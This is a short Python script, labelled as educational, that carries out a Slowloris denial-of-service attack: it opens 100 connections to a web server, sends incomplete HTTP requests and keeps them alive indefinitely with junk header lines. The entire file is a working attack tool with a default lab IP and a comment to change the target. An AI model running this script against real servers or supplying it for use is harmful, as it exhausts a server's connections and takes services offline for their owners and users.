import socket
import time

def slowloris(target_ip="192.168.1.100", target_port=80, sockets=100):
    print(f"[EDU] Simulating Slowloris on {target_ip}:{target_port}")
    sock_list = []
    for _ in range(sockets):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((target_ip, target_port))
            s.send(f"GET / HTTP/1.1\r\nHost: {target_ip}\r\n".encode())
            sock_list.append(s)
        except: pass
    while True:
        for s in sock_list:
            try: s.send("X-a: b\r\n".encode()); time.sleep(10)
            except: pass

if __name__ == "__main__":
    slowloris()  # CHANGE IP TO YOUR LAB SERVER